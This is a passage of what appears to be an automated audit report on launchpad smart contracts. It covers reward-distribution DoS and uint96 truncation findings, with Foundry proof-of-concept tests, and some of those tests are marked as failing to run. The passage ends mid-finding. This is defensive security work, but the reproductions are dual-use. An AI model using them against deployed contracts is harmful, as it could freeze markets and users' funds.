For any launched token whose bonding shares are fully exhausted after unlock, the corresponding GTELaunchpadV2Pair can no longer distribute launchpad fees; all swaps and liquidity events that would trigger fee distribution revert via Distributor.addRewards -> NoSharesToIncentivize, permanently DoS-ing that AMM market.

## Command to Run Test


## Proof of Concept
Revised exploit steps:
1) Deploy Distributor and initialize it with a launchpad address. Deploy a GTELaunchpadV2Pair (via a small factory so pair.factory() is valid) pointing its launchpadFeeDistributor to Distributor.
2) Create a rewards pool in Distributor for (launchAsset=token0, quote=token1) by calling createRewardsPair from the launchpad. Simulate bonding participants: as launch asset, call increaseStake to make rs.totalShares > 0, then call decreaseStake to bring rs.totalShares back to 0. Note: In the real protocol this happens post-unlock via LaunchToken._decreaseFeeShares; here we model the same end-state directly.
3) Provide initial liquidity to the pair (transfer token0 and token1 to the pair and call mint(to=launchpadLp)). This ensures swaps are possible and the launchpad fee share calculation uses a non-zero launchpadLp balance.
4) Advance time by at least one second to ensure pair._update sees timeElapsed > 0 in the next swap.
5) Execute a token0->token1 swap where amount1Out is chosen, and the test transfers the exact amount0In required by Uniswap’s invariant with fee. Because rewardsPoolActive is still 1 and launchpadFeeDistributor is set, the pair computes a positive launchpad fee and calls Distributor.addRewards.
6) Since rs.totalShares == 0, Distributor.addRewards reverts with NoSharesToIncentivize(), bubbling up and reverting the swap. This demonstrates the AMM DoS when endRewards was never called after shares reached zero post-unlock.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";
import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory n, string memory s, uint8 d) { name = n; symbol = s; decimals = d; }

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) {
            require(a >= amount, "allow");
            allowance[from][msg.sender] = a - amount;
        }
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
    }
}

interface IFactoryLike { function feeTo() external view returns (address); }

contract FakeFactory is IFactoryLike {
    function feeTo() external pure returns (address) { return address(0); }

    function deployPair(address token0, address token1, address lp, address distributor) external returns (GTELaunchpadV2Pair p) {
        p = new GTELaunchpadV2Pair(); // factory will be this contract's address
        p.initialize(token0, token1, lp, distributor);
    }
}

contract LaunchpadRewardsEnd_DoS_Test is Test {
    MockERC20 token0; // launch asset
    MockERC20 token1; // quote asset
    Distributor distributor;
    GTELaunchpadV2Pair pair;
    FakeFactory factory;

    address launchpad = address(this); // act as launchpad in this test
    address lpHolder = address(0xA11CE);
    address trader = address(0xBEEF);

    function setUp() public {
        // Deploy tokens
        token0 = new MockERC20("BASE", "BASE", 18);
        token1 = new MockERC20("QUOTE", "QUOTE", 18);

        // Deploy and init Distributor
        distributor = new Distributor();
        distributor.initialize(launchpad);

        // Deploy pair via a factory that implements feeTo()
        factory = new FakeFactory();
        pair = factory.deployPair(address(token0), address(token1), lpHolder, address(distributor));

        // Create rewards pool for (token0, token1)
        vm.prank(launchpad);
        distributor.createRewardsPair(address(token0), address(token1));

        // Simulate bonding stakers exist and then are drained to zero
        address staker = address(0x1234);
        vm.prank(launchpad);
        distributor.increaseStake(address(token0), staker, uint96(1_000)); // rs.totalShares > 0
        vm.prank(launchpad);
        distributor.decreaseStake(address(token0), staker, uint96(1_000)); // rs.totalShares == 0

        // Provide initial liquidity to pair and mint LP to lpHolder
        uint256 amt = 1_000_000 ether;
        token0.mint(address(this), amt);
        token1.mint(address(this), amt);
        token0.transfer(address(pair), 500_000 ether);
        token1.transfer(address(pair), 500_000 ether);
        pair.mint(lpHolder); // sets reserves and mints LP

        // Ensure next swap sees timeElapsed > 0 to trigger distribution path
        vm.warp(block.timestamp + 2);
    }

    function getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        require(amountOut < reserveOut, "too big");
        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        return (numerator / denominator) + 1;
    }

    function test_SwapReverts_WhenTotalSharesZeroAndRewardsActive() public {
        // Read reserves
        (uint112 r0, uint112 r1,) = pair.getReserves();

        // Prepare a token0 -> token1 swap with small amountOut
        uint256 amount1Out = uint256(r1) / 1000; // conservative
        uint256 amount0In = getAmountIn(amount1Out, uint256(r0), uint256(r1));

        // Fund trader and transfer input to pair
        token0.mint(trader, amount0In);
        vm.prank(trader);
        token0.transfer(address(pair), amount0In);

        // Expect revert from Distributor.addRewards due to rs.totalShares == 0
        vm.expectRevert(Distributor.NoSharesToIncentivize.selector);
        vm.prank(trader);
        pair.swap(0, amount1Out, trader, bytes(""));
    }
}


## Suggested Mitigation
Primary fix: ensure endRewards is triggered when all bonding shares are exhausted regardless of unlock state. Remove the `!unlocked` guard in LaunchToken._decreaseFeeShares so the first time totalFeeShare reaches 0 post-unlock, rewards are ended cleanly:

function _decreaseFeeShares(address account, uint256 amount) internal {
    uint256 share = bondingShare[account];
    if (share == 0 || account == address(0)) return;
    amount = amount > share ? share : amount;
    unchecked { totalFeeShare -= amount; bondingShare[account] -= amount; }
    if (totalFeeShare == 0) _endRewards();
    ILaunchpad(launchpad).decreaseStake(account, uint96(amount));
}

Optional hardening (defense-in-depth):
- End rewards proactively during graduation only if the product design intends launchpad AMM fee sharing to stop immediately after unlocking; otherwise prefer the post-unlock zero-shares trigger above.
- In Distributor.addRewards, consider safely no-op when rs.totalShares == 0 instead of reverting (and skip pulling tokens). This avoids market-wide DoS even if a mis-sequenced endRewards occurs. However, the primary logic should still be to end rewards when shares reach zero so the pair stops accruing launchpad fees.





 **Derived From** : Unchecked downcasts in RewardsTracker can overflow user reward debt and break rewards accounting

## [L-18]. uint256→uint96 rewardDebt truncation in RewardsTrackerLib can break reward accounting and DoS claims

### Finding Severity Justification: The code downcasts total accumulated rewards to uint96 without bounds checks in stake/unstake/claim, which can truncate values if totalAccRewards exceeds 2^96-1. This can corrupt rewardDebt and cause subsequent claims/stake/unstake to revert via ClaimAmountExceedsTotalPendingRewards, resulting in a DoS for affected users. However, reaching the overflow threshold requires astronomically large cumulative rewards relative to total shares (effectively distributing many multiples of the total stake supply, or colossal quote rewards over a very long lifetime). There is no realistic path for theft of assets; impact is a potential future DoS, not loss of funds. Hence Low severity.
## Derived From Pattern/Invariant
Unchecked downcasts in RewardsTracker can overflow user reward debt and break rewards accounting

## Exploit Type
AccountingInvariantViolation

## Location
RewardsTrackerLib.stake / unstake / claim

## Finding Status: Valid
## Status Confidence: SomeWhatConfident
### Finding Confidence Justification: The truncation bug is clear from code inspection, but the practical reachability depends on long-term tokenomics (total shares, fee volumes, lifetime). Without exact supply/volume limits for the launch tokens and quote assets, it’s difficult to assert absolute unreachability, so confidence is moderated.
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
RewardsTrackerLib stores `baseRewardDebt` and `quoteRewardDebt` as uint96, but computes them as uint256 via totalAccRewards and then downcasts without any bounds check. Over large lifetimes or high-volume pools, this can cause truncation, corrupting per-user reward debts and breaking the invariant between user rewards and Distributor.totalPendingRewards.

Key structs and functions:

```solidity
struct UserRewardData {
    uint96 shares; // User's current share count (up to ~7.9e28)
    uint96 baseRewardDebt; // Used to calculate base token rewards owed
    uint96 quoteRewardDebt; // Used to calculate quote token rewards owed
}

uint128 public constant PRECISION_FACTOR = 1e12;

function totalAccRewards(uint256 shares, uint256 accRewardsPerShare) internal pure returns (uint256) {
    return (shares * accRewardsPerShare) / PRECISION_FACTOR;
}

function stake(RewardPoolData storage self, address user, uint96 newShares)
    internal
    returns (uint256 baseAmount, uint256 quoteAmount)
{
    ...
    (uint256 accBaseRewardsPerShare, uint256 accQuoteRewardsPerShare) = self.update();
    ...
    uint256 existingShares = uint96(userData.shares);
    ...
    userData.shares += newShares;
    self.totalShares += newShares;

    // unsafe downcasts
    userData.baseRewardDebt = uint96(totalAccRewards(existingShares + newShares, accBaseRewardsPerShare));
    userData.quoteRewardDebt = uint96(totalAccRewards(existingShares + newShares, accQuoteRewardsPerShare));
}

function unstake(RewardPoolData storage self, address user, uint96 removeShares)
    internal
    returns (uint256 baseAmount, uint256 quoteAmount)
{
    ...
    uint256 existingShares = uint256(userData.shares);
    ...
    userData.baseRewardDebt = uint96(totalAccRewards(existingShares - removeShares, accBaseRewardsPerShare));
    userData.quoteRewardDebt = uint96(totalAccRewards(existingShares - removeShares, accQuoteRewardsPerShare));
}

function claim(RewardPoolData storage self, address user)
    internal
    returns (uint256 baseAmount, uint256 quoteAmount)
{
    UserRewardData storage userData = self.userRewards[user];
    uint256 shares = uint256(userData.shares);
    ...
    uint256 totalAccBaseRewards = totalAccRewards(shares, accBaseRewardsPerShare);
    uint256 totalAccQuoteRewards = totalAccRewards(shares, accQuoteRewardsPerShare);

    baseAmount = totalAccBaseRewards - uint128(userData.baseRewardDebt);
    quoteAmount = totalAccQuoteRewards - uint128(userData.quoteRewardDebt);

    // unsafe downcasts
    userData.baseRewardDebt = uint96(totalAccBaseRewards);
    userData.quoteRewardDebt = uint96(totalAccQuoteRewards);
}
```

Solidity truncates on narrowing conversions: if totalAccRewards(...) exceeds `type(uint96).max` (~7.9e28), the assignment `uint96(totalAccRewards(...))` discards high bits. That means:
* `baseRewardDebt` and `quoteRewardDebt` effectively behave modulo 2^96 when cumulative rewards grow large.
* Pending amounts are computed using full 256-bit `totalAccRewards` minus truncated debts, so once wraparound occurs, `baseAmount` and `quoteAmount` can be drastically incorrect: either much larger than the true pending rewards or even revert at the Distributor level.

Distributor trusts these amounts and settles via `_decreaseTotalPending`:

```solidity
function _distributeAssets(address base, uint256 baseAmount, address quote, uint256 quoteAmount) internal {
    if (baseAmount > 0) {
        _decreaseTotalPending(base, baseAmount);
        base.safeTransfer(msg.sender, baseAmount);
    }
    if (quoteAmount > 0) {
        _decreaseTotalPending(quote, quoteAmount);
        quote.safeTransfer(msg.sender, quoteAmount);
    }
}

function _decreaseTotalPending(address asset, uint256 amount) internal {
    uint256 currTotal = totalPendingRewards[asset];
    if (currTotal < amount) revert ClaimAmountExceedsTotalPendingRewards();
    unchecked { totalPendingRewards[asset] -= amount; }
}
```

Once a user's truncated debt causes `baseAmount` to exceed `totalPendingRewards[asset]`, any call that tries to realize their rewards (claim/increaseStake/decreaseStake) will revert with `ClaimAmountExceedsTotalPendingRewards()`, effectively DoSing that user and potentially the whole pool if multiple accounts cross the wraparound threshold.

There is no explicit cap on accBaseRewardPerShare / accQuoteRewardPerShare or on the number/size of addRewards calls. Given long protocol lifetimes, high TVL, and the fact that addRewards is permissionless and also called from GTELaunchpadV2Pair on every swap, it is realistic for cumulative per-share rewards *shares * acc / 1e12* to cross 2^96–1 for at least some users, especially for high-decimal tokens.

This is a classic unsafe downcast-induced accounting invariant violation.

## Impact
Once totalAccRewards(shares, accRewardsPerShare) exceeds 2^96-1, the assignment to uint96 rewardDebt truncates, causing future settlements for that user to compute inflated pending rewards. This makes all subsequent claim/increaseStake/decreaseStake calls for that user revert with ClaimAmountExceedsTotalPendingRewards (since totalPendingRewards is not large enough), effectively DoSing that user’s rewards and stake management. Other users remain unaffected unless they also cross the wrap threshold.

## Command to Run Test


## Proof of Concept
Minimal exploitation path demonstrating the wrap/truncation:

1) Create a rewards pair and give a single user 100% of the shares (e.g., 1 share).
2) Add a single very large base reward R = type(uint128).max. With one staker holding all shares, totalAccRewards equals R.
3) First claim by the user succeeds, paying R, and then sets baseRewardDebt = uint96(R), truncating the high bits.
4) Without adding any new rewards, the user calls claim again. Now totalAccBaseRewards is still R, but debt is truncated to R mod 2^96, so the computed baseAmount = R - (R mod 2^96) > 0. Since totalPendingRewards was fully depleted in step 3, _decreaseTotalPending reverts with ClaimAmountExceedsTotalPendingRewards. This DoSes all further interactions for that user that touch rewards.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "contracts/launchpad/Distributor.sol";

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory n, string memory s, uint256 supply, address to) {
        name = n; symbol = s; balanceOf[to] = supply; emit Transfer(address(0), to, supply);
    }
    function approve(address s, uint256 v) external returns (bool) { allowance[msg.sender][s] = v; emit Approval(msg.sender, s, v); return true; }
    function transfer(address t, uint256 v) external returns (bool) {
        require(balanceOf[msg.sender] >= v, "bal");
        balanceOf[msg.sender] -= v; balanceOf[t] += v; emit Transfer(msg.sender, t, v); return true;
    }
    function transferFrom(address f, address t, uint256 v) external returns (bool) {
        require(allowance[f][msg.sender] >= v, "allow");
        allowance[f][msg.sender] -= v;
        require(balanceOf[f] >= v, "bal");
        balanceOf[f] -= v; balanceOf[t] += v; emit Transfer(f, t, v); return true;
    }
}

contract DowncastDebtTest is Test {
    Distributor dist;
    MockERC20 L;
    MockERC20 Q;
    address user = address(0xB0B);

    function setUp() public {
        dist = new Distributor();
        dist.initialize(address(this)); // set this contract as launchpad
        L = new MockERC20("L", "L", uint256(type(uint128).max) * 2, address(this));
        Q = new MockERC20("Q", "Q", 1e24, address(this));
        dist.createRewardsPair(address(L), address(Q));
        // Give user 100% of shares so totalAccRewards == added rewards amount
        dist.increaseStake(address(L), user, 1); // onlyLaunchpad
    }

    function test_doubleClaim_reverts_due_to_uint96_truncation() public {
        // 1) Add massive base rewards R > 2^96-1
        uint128 R = type(uint128).max;
        L.approve(address(dist), uint256(R));
        dist.addRewards(address(L), address(Q), R, 0);

        // 2) First claim pays R and truncates rewardDebt to uint96(R)
        vm.startPrank(user);
        (uint256 base1, uint256 quote1) = dist.claimRewards(address(L));
        assertEq(base1, uint256(R));
        assertEq(quote1, 0);

        // 3) Second claim (no new rewards) computes inflated pending due to truncated debt and reverts
        vm.expectRevert(Distributor.ClaimAmountExceedsTotalPendingRewards.selector);
        dist.claimRewards(address(L));
        vm.stopPrank();
    }
}


## Suggested Mitigation
Store rewardDebt with a width that cannot truncate realistic cumulative totals and avoid silent downcasts.

Recommended:
- Change UserRewardData to use uint256 for reward debts (or at least uint128 with explicit checked casts):
  struct UserRewardData { uint96 shares; uint256 baseRewardDebt; uint256 quoteRewardDebt; }
- Remove all narrowing casts on totalAccRewards and assign directly to uint256 debts. If smaller types are retained, use SafeCastLib and revert on overflow (fail-fast rather than corrupting state):
  userData.baseRewardDebt = SafeCastLib.toUint128(totalAccRewards(...));
- Optionally cap accBaseRewardPerShare/accQuoteRewardPerShare based on maximum totalShares and max supported rewards to ensure totalAccRewards never exceeds the chosen storage width; reject addRewards that would exceed the cap.
- Standardize subtraction to use the same type as stored debts (i.e., avoid mixing uint96/uint128 in different code paths).





 **Derived From** : Launchpad fee distribution relies on external Distributor that can brick swaps

## [M-19]. Distributor.addRewards revert when totalShares == 0 causes permanent DoS of GTELaunchpadV2Pair swaps

### Finding Severity Justification: A zero-share state in the Distributor causes addRewards() to revert, and because GTELaunchpadV2Pair unconditionally calls it during _update without try/catch, the AMM pair’s core functions (swap/mint/burn/sync) can be reverted, freezing trading and LP operations. This is a liveness/availability failure rather than direct fund theft, so Medium per Code4rena rubric.
## Derived From Pattern/Invariant
Launchpad fee distribution relies on external Distributor that can brick swaps

## Exploit Type
Dos

## Location
GTELaunchpadV2Pair / Distributor.GTELaunchpadV2Pair.swap (via _update -> _distributeLaunchpadFees -> Distributor.addRewards)

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The launchpad AMM pair `GTELaunchpadV2Pair` sends a portion of each swap’s fee to the external `Distributor` via `_distributeLaunchpadFees`, called from `_update` on every swap/mint/burn/sync. That external call is required for core flows and is not isolated with `try/catch`.

Relevant pair code:

```solidity
function _update(
    uint256 balance0,
    uint256 balance1,
    uint112 _reserve0,
    uint112 _reserve1,
    uint112 newLaunchpadFee0,
    uint112 newLaunchpadFee1
) private {
    ...
    uint112 totalLaunchpadFee0 = accruedLaunchpadFee0 + newLaunchpadFee0;
    uint112 totalLaunchpadFee1 = accruedLaunchpadFee1 + newLaunchpadFee1;
    ...
    if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {
        ...
        if (launchpadFeeDistributor > address(0)) {
            if (totalLaunchpadFee0 | totalLaunchpadFee1 > 0) {
                delete accruedLaunchpadFee0;
                delete accruedLaunchpadFee1;
                _distributeLaunchpadFees(totalLaunchpadFee0, totalLaunchpadFee1);
            }
        }
    } else if (launchpadFeeDistributor > address(0) && newLaunchpadFee0 | newLaunchpadFee1 > 0) {
        accruedLaunchpadFee0 = totalLaunchpadFee0;
        accruedLaunchpadFee1 = totalLaunchpadFee1;
        emit LaunchpadFeesAccrued(newLaunchpadFee0, newLaunchpadFee1);
    }
    ...
}

function _distributeLaunchpadFees(uint112 fee0, uint112 fee1) internal {
    if ((fee0 | fee1) > 0) {
        address _token0 = token0;
        address _token1 = token1;
        address distributor = launchpadFeeDistributor;

        if (fee0 > 0) _safeApprove(_token0, distributor, uint256(fee0));
        if (fee1 > 0) _safeApprove(_token1, distributor, uint256(fee1));

        IDistributor(distributor).addRewards(_token0, _token1, uint128(fee0), uint128(fee1));

        emit LaunchpadFeesCollected(fee0, fee1);
    }
}
```

`IDistributor.addRewards` has a hard requirement that the corresponding reward pool has **non-zero shares**:

```solidity
function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {
    (address launchAsset, address quoteAsset, uint128 launchAssetAmount, uint128 quoteAssetAmount) =
        (token0, token1, amount0, amount1);
    RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(token0);

    if (rs.quoteAsset == address(0)) {
        rs = RewardsTrackerStorage.getRewardPool(token1);
        if (rs.quoteAsset == address(0)) revert RewardsDoNotExist();
        (launchAsset, quoteAsset, launchAssetAmount, quoteAssetAmount) = (token1, token0, amount1, amount0);
    }

    if (rs.totalShares == 0) revert NoSharesToIncentivize();
    ...
}
```

As long as any user has bonding/staking shares, `rs.totalShares > 0`, and fee distribution works. However, once all launchpad stakers fully unstake (via `Distributor.decreaseStake` calls from the Launchpad), `rs.totalShares` can legitimately drop to 0 **while `GTELaunchpadV2Pair.rewardsPoolActive` remains 1** and swaps are still enabled.

At that point:

1. Future swaps on the pair still compute launchpad fees in `swap()`:

```solidity
(uint112 launchpadFee0, uint112 launchpadFee1) =
    launchpadFeeDistributor > address(0) && rewardsPoolActive > 0 ?
        _getLaunchpadFees(amount0In, amount1In) : (uint112(0), uint112(0));

_update(balance0, balance1, _reserve0, _reserve1, launchpadFee0, launchpadFee1);
```

2. `_update` sees `totalLaunchpadFee0|totalLaunchpadFee1 > 0` and calls `_distributeLaunchpadFees(...)`.
3. `_distributeLaunchpadFees` calls `Distributor.addRewards`, which now reverts with `NoSharesToIncentivize()` because `rs.totalShares == 0`.
4. This revert bubbles up, so `_update` reverts, which causes **every swap (and any other entrypoint that calls `_update` with non‑zero fees)** to revert.

Because `_update` is used in `swap`, `mint`, `burn`, and `sync`, the pool becomes effectively unusable: users cannot trade, mint or burn LP once `totalShares` hits zero and there are non-zero accrued fees to send.

## Impact
Any GTELaunchpadV2Pair with launchpad fees enabled will brick swaps/mint/burn/sync once Distributor.addRewards reverts due to totalShares == 0. This can happen either because all stakers legitimately exited or even if the rewards pool was created but never received shares. As the pair unconditionally calls addRewards inside _update and subtracts fees from balances/reserves on every price update, the revert bubbles and permanently DoSes the AMM until governance/launchpad disables rewards (endRewardsAccrual) or the Distributor logic is changed.

## Command to Run Test


## Proof of Concept
1) Deploy a GTELaunchpadV2Pair with a valid Distributor set as launchpadFeeDistributor and rewardsPoolActive = 1.
2) In Distributor, createRewardsPair(token0, token1) but keep totalShares = 0 (e.g., no one is staked, or all stakers have exited).
3) Add initial liquidity to the pair (transfer token0 and token1 to the pair, then call mint to the launchpadLp address so LP tokens exist).
4) Advance time by 1 second to ensure _update sees timeElapsed > 0.
5) Perform a normal swap that generates non-zero launchpad fees (e.g., send token0 in and swap for token1 out). During swap, _getLaunchpadFees returns > 0, so _update -> _distributeLaunchpadFees calls Distributor.addRewards(...).
6) addRewards detects rs.totalShares == 0 and reverts with NoSharesToIncentivize(). The revert bubbles, causing the swap to fail. Subsequent swaps/mint/burn/sync that attempt to distribute fees will also revert, bricking the pool until endRewardsAccrual is called.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";
import {IUniswapV2Pair} from "@gte-univ2-core/interfaces/IUniswapV2Pair.sol";

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) { name = n; symbol = s; }

    function mint(address to, uint256 v) external { totalSupply += v; balanceOf[to] += v; emit Transfer(address(0), to, v); }
    function transfer(address to, uint256 v) external returns (bool){ require(balanceOf[msg.sender] >= v, "bal"); balanceOf[msg.sender]-=v; balanceOf[to]+=v; emit Transfer(msg.sender, to, v); return true; }
    function approve(address s, uint256 v) external returns (bool){ allowance[msg.sender][s]=v; emit Approval(msg.sender, s, v); return true; }
    function transferFrom(address f,address t,uint256 v) external returns (bool){ uint256 a = allowance[f][msg.sender]; if (a != type(uint256).max) { require(a >= v, "allow"); allowance[f][msg.sender]=a-v; } require(balanceOf[f] >= v, "balF"); balanceOf[f]-=v; balanceOf[t]+=v; emit Transfer(f, t, v); return true; }

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract LaunchpadFeesDoSFixedRepro is Test {
    GTELaunchpadV2Pair pair;
    Distributor dist;
    MockERC20 token0;
    MockERC20 token1;

    function setUp() public {
        token0 = new MockERC20("T0", "T0");
        token1 = new MockERC20("T1", "T1");

        // Set up Distributor with test as owner and launchpad
        dist = new Distributor();
        dist.initialize(address(this)); // launchpad = this

        // Deploy pair; constructor sets factory = msg.sender (this test), so initialize is allowed
        pair = new GTELaunchpadV2Pair();
        pair.initialize(address(token0), address(token1), address(this), address(dist)); // launchpadLp = this

        // Create rewards pool for (token0, token1), but do NOT stake: totalShares == 0
        dist.createRewardsPair(address(token0), address(token1));

        // Seed initial liquidity (1000/1000) and mint LP to launchpadLp (this)
        token0.mint(address(this), 1_000 ether);
        token1.mint(address(this), 1_000 ether);
        token0.transfer(address(pair), 1_000 ether);
        token1.transfer(address(pair), 1_000 ether);
        pair.mint(address(this));
    }

    function _getAmountOut(uint256 amountIn, uint112 reserveIn, uint112 reserveOut) internal pure returns (uint256) {
        // Uniswap V2 formula with 0.3% fee (997/1000)
        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * uint256(reserveOut)) / (uint256(reserveIn) * 1000 + amountInWithFee);
    }

    function test_swapRevertsDueToNoSharesInDistributor() public {
        // Ensure timeElapsed > 0 so _update attempts immediate distribution
        vm.warp(block.timestamp + 1);

        // Prepare an input swap: token0 -> token1
        (uint112 r0, uint112 r1, ) = pair.getReserves();
        uint256 amountIn = 10 ether;
        uint256 amountOut = _getAmountOut(amountIn, r0, r1);
        assertGt(amountOut, 0);

        // Transfer input to pair before calling swap (exact-output style)
        token0.mint(address(this), amountIn);
        token0.transfer(address(pair), amountIn);

        // Expect revert bubbling from Distributor.addRewards: NoSharesToIncentivize()
        vm.expectRevert(Distributor.NoSharesToIncentivize.selector);
        pair.swap(0, amountOut, address(this), "");
    }
}


## Suggested Mitigation
Best fix: make Distributor.addRewards non-reverting when totalShares == 0. Instead of reverting, accept the rewards and record them as pending so they can be distributed when shares reappear. This preserves AMM liveness and avoids bricking the pair.

Suggested change in Distributor.addRewards:
- Remove `if (rs.totalShares == 0) revert NoSharesToIncentivize();`
- Replace with:
  - If totalShares == 0, still:
    - rs.addBaseRewards(launchAsset, launchAssetAmount) and rs.addQuoteRewards(...)
    - _increaseTotalPending(...) for each asset
    - safeTransferFrom(msg.sender, address(this), amounts)
    - return (no revert)

Defense-in-depth (optional but recommended):
- Expose a lightweight view in Distributor (e.g., hasActiveShares(launchAsset) -> bool) or reuse getRewardsPoolData to read totalShares.
- In GTELaunchpadV2Pair._getLaunchpadFees, set fees to zero if Distributor reports no active shares for the relevant pool, so the pair won’t attempt external distribution in that case.
- Alternatively, in GTELaunchpadV2Pair._distributeLaunchpadFees, wrap the external call in try/catch and only clear accruedLaunchpadFee0/1 after a successful addRewards call; on failure, keep fees accrued and do not revert, to preserve liveness.


## [L-20]. External Distributor callback in _distributeLaunchpadFees can DoS swaps and liquidity ops if misconfigured

### Finding Severity Justification: Calling an external Distributor from the pair’s _update() (used by swap/mint/burn/sync) can revert and DoS core AMM operations if the Distributor reverts. Impact is high (trading/lp operations halted), but it requires governance misconfiguration or trusted module behavior (e.g., Distributor not initialized, pool not created, or shares == 0) to manifest. Per contest rules, privileged roles are trusted and admin misconfigurations are QA/Low.
## Derived From Pattern/Invariant
Launchpad fee distribution relies on external Distributor that can brick swaps

## Exploit Type
Dos

## Location
GTELaunchpadV2Pair._distributeLaunchpadFees/_update

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresAdminRole


## Description
The pair’s `_update` function, used by `swap`, `mint`, `burn`, and `sync`, calls `_distributeLaunchpadFees`, which in turn calls an external `IDistributor.addRewards` without any failure isolation (no `try/catch`, no gas stipend). If `launchpadFeeDistributor` points to a contract that reverts, runs out of gas, or self-destructs, then all critical AMM operations that reach the fee-distribution branch will revert as well, effectively bricking the pair.

Relevant code (GTELaunchpadV2Pair):
```solidity
address public launchpadFeeDistributor;

function _update(
    uint256 balance0,
    uint256 balance1,
    uint112 _reserve0,
    uint112 _reserve1,
    uint112 newLaunchpadFee0,
    uint112 newLaunchpadFee1
) private {
    ...
    uint112 totalLaunchpadFee0 = accruedLaunchpadFee0 + newLaunchpadFee0;
    uint112 totalLaunchpadFee1 = accruedLaunchpadFee1 + newLaunchpadFee1;
    ...
    if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {
        ...
        if (launchpadFeeDistributor > address(0)) {
            if (totalLaunchpadFee0 | totalLaunchpadFee1 > 0) {
                delete accruedLaunchpadFee0;
                delete accruedLaunchpadFee1;
                _distributeLaunchpadFees(totalLaunchpadFee0, totalLaunchpadFee1);
            }
        }
    } else if (launchpadFeeDistributor > address(0) && newLaunchpadFee0 | newLaunchpadFee1 > 0) {
        accruedLaunchpadFee0 = totalLaunchpadFee0;
        accruedLaunchpadFee1 = totalLaunchpadFee1;
        emit LaunchpadFeesAccrued(newLaunchpadFee0, newLaunchpadFee1);
    }
    ...
}

function _distributeLaunchpadFees(uint112 fee0, uint112 fee1) internal {
    if ((fee0 | fee1) > 0) {
        address _token0 = token0;
        address _token1 = token1;
        address distributor = launchpadFeeDistributor;

        if (fee0 > 0) _safeApprove(_token0, distributor, uint256(fee0));
        if (fee1 > 0) _safeApprove(_token1, distributor, uint256(fee1));

        IDistributor(distributor).addRewards(_token0, _token1, uint128(fee0), uint128(fee1));

        emit LaunchpadFeesCollected(fee0, fee1);
    }
}
```
If `addRewards` ever reverts due to internal logic (e.g., `RewardsDoNotExist`, `NoSharesToIncentivize`, or an invariant failure) or if governance mistakenly sets `launchpadFeeDistributor` to an incompatible contract, then any call path that triggers `_distributeLaunchpadFees` will revert. Given `_update` is called in `swap`, `mint`, `burn`, and `sync`, this can DoS the core functionality of the pair.

Because trusted governance is responsible for configuring and maintaining the Distributor, and privileged roles are trusted per the scope, this is assessed as a centralization / misconfiguration risk rather than an attacker-controlled exploit.

## Impact
When launchpadFeeDistributor is set but misbehaves (e.g., Distributor not initialized, rewards pair not created, or totalShares == 0), any swap that accrues launchpad fees and lands in a new-timestamp _update will revert due to the external addRewards call, halting swaps/mints/burns/syncs that reach distribution. This bricks the pair until governance fixes the Distributor address or state. This requires trusted/governance misconfiguration or a bad Distributor upgrade/state, so severity remains Low.

## Command to Run Test


## Proof of Concept
High-level steps to deterministically trigger the DoS:
1) Deploy two ERC20 test tokens and a minimal MockFactory that returns feeTo() = address(0).
2) From MockFactory, deploy GTELaunchpadV2Pair so its factory is the MockFactory, then initialize(token0, token1, launchpadLp, badDistributor), where badDistributor is a contract that reverts in addRewards.
3) Provide initial liquidity by transferring equal amounts of both tokens to the pair and calling pair.mint(launchpadLp) so launchpadLp holds essentially all LP supply (ensuring _getLaunchpadFees produces non-zero fees).
4) Warp time forward by 1 second to ensure timeElapsed > 0.
5) Pre-transfer a small amount of token0 to the pair as the swap input.
